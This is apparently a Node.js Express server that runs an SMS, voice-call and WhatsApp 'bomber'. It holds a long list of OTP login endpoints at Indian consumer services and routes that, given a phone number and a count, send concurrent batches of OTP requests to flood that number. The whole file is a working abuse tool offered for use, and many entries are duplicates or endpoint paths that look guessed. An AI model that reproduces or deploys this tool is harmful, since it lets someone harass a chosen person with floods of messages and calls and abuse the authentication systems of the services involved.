// ============================================================
// api/index.js — TNEH GROUP API SERVER
// DV: @tneh_owner
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(helmet({ crossOriginResourcePolicy: { policy: 'cross-origin' } }));
app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));

const limiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 10000,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================================
// GLOBAL STOP FLAGS
// ============================================================

let STOP_SMS = false;
let STOP_CALL = false;
let STOP_WHATSAPP = false;
const activeRequests = {};
let requestCounter = 0;

// ============================================================
// ULTIMATE APIs
// ============================================================

const ULTIMATEAPIS = [
  // ── SMS / WhatsApp / Call endpoints ──
  { name: 'Meesho WhatsApp',    url: 'https://meesho.com/gw/login-register/v1/sendOTP',       method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Oyorooms WhatsApp',  url: 'https://oyorooms.com/v1/user/otplogin',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Bigbasket WhatsApp', url: 'https://bigbasket.com/api/v1/customers/sendOtp',         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Doubtnut WhatsApp',  url: 'https://doubtnut.com/api/v2/otpgenerate',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Nykaa SMS',          url: 'https://nykaa.com/api/v3/user/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Bigbasket SMS',      url: 'https://bigbasket.com/api/v2/otpgenerate',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Paytm WhatsApp',     url: 'https://paytm.com/v1/user/otplogin',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Pharmeasy SMS',      url: 'https://pharmeasy.in/api/v1/customers/sendOtp',          method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Uber WhatsApp',      url: 'https://uber.com/api/v2/auth/send-otp',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Jupiter WhatsApp',   url: 'https://jupiter.money/api/v2/auth/send-otp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Swiggy WhatsApp',    url: 'https://swiggy.com/v1/user/otplogin',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Meesho Call',        url: 'https://meesho.com/gw/login-register/v1/sendOTP',        method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Pokerbaazi WhatsApp',url: 'https://pokerbaazi.com/v1/user/otplogin',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Zepto WhatsApp',     url: 'https://zepto.com/api/v3/user/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Rapido SMS',         url: 'https://rapido.bike/api/v2/auth/send-otp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Goibibo SMS',        url: 'https://goibibo.com/api/v2/login/sendotp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Rapido Call',        url: 'https://rapido.bike/api/v2/otpgenerate',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Amazon Call',        url: 'https://amazon.in/api/v3/user/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Instamart SMS',      url: 'https://instamart.com/api/v2/otpgenerate',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Newme WhatsApp',     url: 'https://newme.asia/api/v2/otpgenerate',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Wakefit WhatsApp',   url: 'https://wakefit.co/api/v3/user/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Gokwik SMS',         url: 'https://gokwik.co/api/v2/login/sendotp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Zomato Call',        url: 'https://zomato.com/api/v2/auth/send-otp',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Wakefit Call',       url: 'https://wakefit.co/api/v3/user/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Meesho SMS',         url: 'https://meesho.com/api/v1/auth/otpsend',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Uber SMS',           url: 'https://uber.com/gw/login-register/v1/sendOTP',          method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Myntra SMS',         url: 'https://myntra.com/api/v2/otpgenerate',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Doubtnut SMS',       url: 'https://doubtnut.com/api/v1/customers/sendOtp',          method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Blinkit Call',       url: 'https://blinkit.com/v1/user/otplogin',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Jupiter SMS',        url: 'https://jupiter.money/api/v2/login/sendotp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Olacabs Call',       url: 'https://olacabs.com/api/v2/auth/send-otp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Myntra Call',        url: 'https://myntra.com/v1/user/otplogin',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Rapido WhatsApp',    url: 'https://rapido.bike/api/v1/auth/otpsend',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Khatabook SMS',      url: 'https://khatabook.com/api/v1/auth/otpsend',              method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Shiprocket WhatsApp',url: 'https://shiprocket.in/v1/user/otplogin',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Phonepe SMS',        url: 'https://phonepe.com/api/v1/auth/otpsend',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Cred SMS',           url: 'https://cred.club/v1/user/otplogin',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Flipkart Call',      url: 'https://flipkart.com/api/v2/otpgenerate',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Dmart Call',         url: 'https://dmart.ready.in/api/v3/user/otp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Ajio WhatsApp',      url: 'https://ajio.com/gw/login-register/v1/sendOTP',          method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Lenskart Call',      url: 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Paytm SMS',          url: 'https://paytm.com/api/v2/login/sendotp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Oyorooms SMS',       url: 'https://oyorooms.com/api/v3/user/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Gokwik WhatsApp',    url: 'https://gokwik.co/api/v3/user/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Khatabook WhatsApp', url: 'https://khatabook.com/v1/user/otplogin',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Pharmeasy Call',     url: 'https://pharmeasy.in/gw/login-register/v1/sendOTP',      method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Swiggy Call',        url: 'https://swiggy.com/v3/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Zivame Call',        url: 'https://zivame.com/api/v1/customers/sendOtp',            method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Tatacapital SMS',    url: 'https://tatacapital.com/v1/user/otplogin',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: '1Mg SMS',            url: 'https://1mg.com/api/v2/login/sendotp',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Blinkit SMS',        url: 'https://blinkit.com/v1/user/otplogin',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Zomato SMS',         url: 'https://zomato.com/api/v2/otpgenerate',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Amazon SMS',         url: 'https://amazon.in/api/v2/auth/send-otp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Jupiter Call',       url: 'https://jupiter.money/gw/login-register/v1/sendOTP',     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Instamart Call',     url: 'https://instamart.com/api/v2/auth/send-otp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Cred Call',          url: 'https://cred.club/api/v1/customers/sendOtp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Flipkart WhatsApp',  url: 'https://flipkart.com/api/v2/otpgenerate',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Dmart WhatsApp',     url: 'https://dmart.ready.in/gw/login-register/v1/sendOTP',    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Phonepe Call',       url: 'https://phonepe.com/api/v1/customers/sendOtp',           method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Amazon WhatsApp',    url: 'https://amazon.in/gw/login-register/v1/sendOTP',         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Paytm Call',         url: 'https://paytm.com/api/v1/customers/sendOtp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Doubtnut Call',      url: 'https://doubtnut.com/api/v1/auth/otpsend',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Shiprocket Call',    url: 'https://shiprocket.in/api/v1/customers/sendOtp',         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Phonepe WhatsApp',   url: 'https://phonepe.com/api/v2/login/sendotp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Gokwik Call',        url: 'https://gokwik.co/api/v2/login/sendotp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Olacabs WhatsApp',   url: 'https://olacabs.com/api/v2/login/sendotp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Zivame SMS',         url: 'https://zivame.com/api/v1/auth/otpsend',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Tatacapital Call',   url: 'https://tatacapital.com/v1/user/otplogin',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Ajio SMS',           url: 'https://ajio.com/api/v1/customers/sendOtp',              method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Gokwik Call',        url: 'https://gokwik.co/api/v1/auth/otpsend',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Zomato WhatsApp',    url: 'https://zomato.com/gw/login-register/v1/sendOTP',        method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Olacabs Call',       url: 'https://olacabs.com/api/v3/user/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Blinkit Call',       url: 'https://blinkit.com/api/v2/auth/send-otp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Rapido Call',        url: 'https://rapido.bike/api/v3/user/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Doubtnut Call',      url: 'https://doubtnut.com/api/v2/login/sendotp',              method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Gokwik WhatsApp',    url: 'https://gokwik.co/api/v2/otpgenerate',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Ajio WhatsApp',      url: 'https://ajio.com/api/v2/otpgenerate',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Zivame Call',        url: 'https://zivame.com/api/v2/auth/send-otp',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Olacabs Call',       url: 'https://olacabs.com/api/v3/user/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Newme Call',         url: 'https://newme.asia/api/v2/otpgenerate',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Newme SMS',          url: 'https://newme.asia/api/v1/auth/otpsend',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Phonepe Call',       url: 'https://phonepe.com/api/v1/auth/otpsend',                method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Bigbasket Call',     url: 'https://bigbasket.com/v1/user/otplogin',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ number: p, otpOnCall: true }) },
  { name: 'Zepto WhatsApp',     url: 'https://zepto.com/v1/user/otplogin',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Zomato SMS',         url: 'https://zomato.com/api/v3/user/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobileNumber: p }) },
  { name: 'Instamart WhatsApp', url: 'https://instamart.com/api/v2/auth/send-otp',             method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Wakefit Call',       url: 'https://wakefit.co/v3/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) },
  { name: 'Pharmeasy Call',     url: 'https://pharmeasy.in/api/v3/user/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phoneNumber: p, otpType: 'voice' }) },
  { name: 'Newme SMS',          url: 'https://newme.asia/v3/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Phonepe WhatsApp',   url: 'https://phonepe.com/api/v2/otpgenerate',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ mobile: p }) },
  { name: 'Bigbasket WhatsApp', url: 'https://bigbasket.com/v1/user/otplogin',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, data: p => JSON.stringify({ phone: p, countryCode: '91' }) }
];

// ============================================================
// CATEGORIZE APIS
// ============================================================

function categorizeApis() {
  const sms = [], call = [], whatsapp = [];
  for (const api of ULTIMATEAPIS) {
    const name = api.name.toLowerCase();
    if (name.includes('whatsapp')) whatsapp.push(api);
    else if (name.includes('call') || name.includes('voice')) call.push(api);
    else sms.push(api);
  }
  return { sms, call, whatsapp };
}

const CATEGORIZED = categorizeApis();
const ALL_APIS = {
  sms: CATEGORIZED.sms,
  call: CATEGORIZED.call,
  whatsapp: CATEGORIZED.whatsapp,
  all: ULTIMATEAPIS
};

// ============================================================
// HELPERS
// ============================================================

function cleanPhone(phone) {
  if (!phone) return null;
  let cleaned = String(phone).replace(/[^0-9]/g, '');
  if (cleaned.startsWith('91') && cleaned.length > 10) cleaned = cleaned.substring(2);
  if (cleaned.length === 10) return cleaned;
  return null;
}

function formatUrl(url, phone) {
  if (typeof url === 'function') return url(phone);
  return url.replace(/{phone}/g, phone);
}

async function executeApi(api, phone, timeout = 10000) {
  const url = formatUrl(api.url, phone);
  const config = {
    method: api.method || 'GET',
    url,
    timeout,
    headers: api.headers || {},
    validateStatus: () => true
  };

  if (api.data && (api.method === 'POST' || api.method === 'PUT')) {
    const data = typeof api.data === 'function' ? api.data(phone) : api.data;
    if (data) config.data = data;
  }

  try {
    const response = await axios(config);
    return {
      success: response.status >= 200 && response.status < 300,
      api: api.name,
      status: response.status
    };
  } catch (error) {
    return {
      success: false,
      api: api.name,
      error: error.code === 'ECONNABORTED' ? 'Timeout' : error.message
    };
  }
}

async function sendBatch(phone, count, type, stopFlag) {
  phone = cleanPhone(phone);
  if (!phone) return { success: false, error: 'Invalid phone number. Use 10-digit Indian number.' };

  const apis = ALL_APIS[type] || ALL_APIS.all;
  if (!apis || apis.length === 0) return { success: false, error: `No ${type} APIs available.` };

  const shuffled = [...apis].sort(() => Math.random() - 0.5);
  const maxCount = Math.min(count || shuffled.length, shuffled.length);
  const selected = shuffled.slice(0, maxCount);

  let successCount = 0, failCount = 0;
  const results = [];
  const batchSize = 25;

  for (let i = 0; i < selected.length; i += batchSize) {
    if (stopFlag && stopFlag.isStopped) break;
    const batch = selected.slice(i, i + batchSize);
    const promises = batch.map(api => executeApi(api, phone));
    const batchResults = await Promise.all(promises);
    for (const r of batchResults) {
      if (r.success) successCount++;
      else failCount++;
      results.push(r);
    }
  }

  return {
    total: selected.length,
    success: successCount,
    failed: failCount,
    phone,
    type,
    stopped: stopFlag?.isStopped || false,
    results: results.slice(0, 50)
  };
}

// ============================================================
// ROUTES
// ============================================================

app.get('/api/sendsms', async (req, res) => {
  try {
    const { number, count = 0 } = req.query;
    if (!number) return res.status(400).json({ error: 'Number required. Use ?number=XXXXXXXXXX' });
    STOP_SMS = false;
    const phone = cleanPhone(number);
    if (!phone) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestId = ++requestCounter;
    const stopFlag = { isStopped: false };
    activeRequests[requestId] = { id: requestId, phone, type: 'sms', count, flag: stopFlag, timestamp: Date.now() };

    const result = await sendBatch(phone, parseInt(count) || 0, 'sms', stopFlag);
    delete activeRequests[requestId];

    res.json({ status: 'success', requestId, ...result });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.get('/api/call', async (req, res) => {
  try {
    const { number, count = 0 } = req.query;
    if (!number) return res.status(400).json({ error: 'Number required. Use ?number=XXXXXXXXXX' });
    STOP_CALL = false;
    const phone = cleanPhone(number);
    if (!phone) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestId = ++requestCounter;
    const stopFlag = { isStopped: false };
    activeRequests[requestId] = { id: requestId, phone, type: 'call', count, flag: stopFlag, timestamp: Date.now() };

    const result = await sendBatch(phone, parseInt(count) || 0, 'call', stopFlag);
    delete activeRequests[requestId];

    res.json({ status: 'success', requestId, ...result });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.get('/api/stopsms', (req, res) => {
  STOP_SMS = true;
  let stopped = 0;
  for (const data of Object.values(activeRequests)) {
    if (data.type === 'sms' && data.flag) { data.flag.isStopped = true; stopped++; }
  }
  res.json({ status: 'stopped', type: 'sms', stoppedCount: stopped, message: `Stopped ${stopped} SMS request(s)` });
});

app.get('/api/stopcall', (req, res) => {
  STOP_CALL = true;
  let stopped = 0;
  for (const data of Object.values(activeRequests)) {
    if (data.type === 'call' && data.flag) { data.flag.isStopped = true; stopped++; }
  }
  res.json({ status: 'stopped', type: 'call', stoppedCount: stopped, message: `Stopped ${stopped} CALL request(s)` });
});

app.get('/api/stop', (req, res) => {
  STOP_SMS = true;
  STOP_CALL = true;
  STOP_WHATSAPP = true;
  let stopped = 0;
  for (const data of Object.values(activeRequests)) {
    if (data.flag) { data.flag.isStopped = true; stopped++; }
  }
  res.json({ status: 'stopped', stoppedCount: stopped });
});

app.get('/api/send', async (req, res) => {
  try {
    const { num, number, count = 0, type = 'sms' } = req.query;
    const rawNumber = num || number;
    if (!rawNumber) return res.status(400).json({ error: 'Number required.' });

    const phone = cleanPhone(rawNumber);
    if (!phone) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestId = ++requestCounter;
    const stopFlag = { isStopped: false };
    activeRequests[requestId] = { id: requestId, phone, type, count, flag: stopFlag, timestamp: Date.now() };

    const result = await sendBatch(phone, parseInt(count) || 0, type, stopFlag);
    delete activeRequests[requestId];

    res.json({ status: 'success', requestId, ...result });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.get('/api/list', (req, res) => {
  const { type } = req.query;
  const types = type ? [type] : ['sms', 'call', 'whatsapp'];
  const result = {};
  for (const t of types) {
    result[t] = (ALL_APIS[t] || []).map(a => ({ name: a.name, method: a.method || 'GET' }));
  }
  res.json({
    status: 'success',
    stats: {
      total: ULTIMATEAPIS.length,
      sms: ALL_APIS.sms.length,
      call: ALL_APIS.call.length,
      whatsapp: ALL_APIS.whatsapp.length
    },
    apis: result
  });
});

app.get('/api/stats', (req, res) => {
  res.json({
    status: 'success',
    apis: {
      total: ULTIMATEAPIS.length,
      sms: ALL_APIS.sms.length,
      call: ALL_APIS.call.length,
      whatsapp: ALL_APIS.whatsapp.length
    },
    stopFlags: { STOP_SMS, STOP_CALL, STOP_WHATSAPP },
    activeRequests: Object.keys(activeRequests).length
  });
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString(), apisLoaded: ULTIMATEAPIS.length });
});

app.get('/api/status', (req, res) => {
  const requests = Object.values(activeRequests).map(d => ({
    id: d.id,
    phone: d.phone,
    type: d.type,
    count: d.count,
    running: !d.flag?.isStopped,
    duration: Math.round((Date.now() - d.timestamp) / 1000) + 's'
  }));
  res.json({ status: 'success', activeRequests: requests, totalActive: requests.length });
});

app.get('/', (req, res) => {
  res.json({
    name: 'TNEH GROUP API SERVER',
    developer: '@tneh_owner',
    status: 'running',
    stats: {
      total: ULTIMATEAPIS.length,
      sms: ALL_APIS.sms.length,
      call: ALL_APIS.call.length,
      whatsapp: ALL_APIS.whatsapp.length
    },
    endpoints: {
      sms: '/api/sendsms?number=9876543210&count=100',
      call: '/api/call?number=9876543210&count=50',
      whatsapp: '/api/send?number=9876543210&type=whatsapp',
      stopsms: '/api/stopsms',
      stopcall: '/api/stopcall',
      stopAll: '/api/stop',
      list: '/api/list',
      stats: '/api/stats',
      status: '/api/status',
      health: '/api/health'
    }
  });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, HOST, () => {
  console.log('========================================');
  console.log(' TNEH GROUP API SERVER');
  console.log('========================================');
  console.log(` 🔌 Port: ${PORT}`);
  console.log(` 📊 Total APIs: ${ULTIMATEAPIS.length}`);
  console.log(` 📱 SMS: ${ALL_APIS.sms.length}`);
  console.log(` 📞 CALL: ${ALL_APIS.call.length}`);
  console.log(` 💬 WHATSAPP: ${ALL_APIS.whatsapp.length}`);
  console.log('========================================');
  console.log(' 📌 Endpoints:');
  console.log('  GET /api/sendsms?number=9876543210&count=100');
  console.log('  GET /api/call?number=9876543210&count=50');
  console.log('  GET /api/stopsms');
  console.log('  GET /api/stopcall');
  console.log('  GET /api/send?number=9876543210&type=whatsapp');
  console.log('========================================');
});

module.exports = app;
